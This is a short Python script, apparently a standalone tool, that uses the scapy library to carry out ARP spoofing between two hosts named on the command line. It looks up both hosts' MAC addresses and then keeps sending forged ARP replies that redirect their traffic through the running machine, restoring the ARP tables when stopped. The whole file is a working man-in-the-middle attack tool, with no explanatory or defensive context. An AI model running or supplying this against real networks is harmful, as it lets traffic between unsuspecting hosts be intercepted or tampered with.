from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf
import sys, time, logging

conf.verb = 0
logging.getLogger("scapy").setLevel(logging.CRITICAL)

if len(sys.argv) != 3:
    print("Usage: arp_spoof <net> <net>")
    sys.exit(1)

def get_mac_by_ip(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=2)[0]

    if result:
        return result[0][1].hwsrc
    else:
        raise RuntimeError(f"Could not resolve MAC address for IP {ip}")

def spoof_target(source_ip, dest_ip, source_mac, dest_mac):
    arp = ARP(hwsrc=source_mac, hwdst=dest_mac, pdst= dest_ip, psrc=source_ip, op=2)
    ether = Ether(dst=dest_mac)
    packet = ether / arp

    result = sendp(packet)

iface = "eth0"
my_mac = get_if_hwaddr(iface)

ip1 = sys.argv[1]
ip2 = sys.argv[2]
mac_ip1 = get_mac_by_ip(ip1)
mac_ip2 = get_mac_by_ip(ip2)

try:
    print("Starting ARP spoofing... Press Ctrl+C to stop.")
    print(f"[+] Spoofing {ip2}: {ip1} is at {my_mac}")
    print(f"[+] Spoofing {ip1}: {ip2} is at {my_mac}")
    while True:
        spoof_target(ip2, ip1, my_mac, mac_ip1)
        spoof_target(ip1, ip2, my_mac, mac_ip2)
        time.sleep(2)
        
except KeyboardInterrupt:
    print("\n[!] Detected Ctrl+C! Restoring ARP tables...")

except Exception as e:
    print(f"\n[!] Unexpected error: {e}\nRestoring ARP tables...")

finally:
    print(f"[+] Spoofing {ip2}: {ip1} is at {mac_ip1}")
    print(f"[+] Spoofing {ip1}: {ip2} is at {mac_ip2}")
    spoof_target(ip1, ip2, mac_ip1, mac_ip2)
    spoof_target(ip2, ip1, mac_ip2, mac_ip1)
    print("[+] ARP tables restored. Exiting.")
    exit(0)


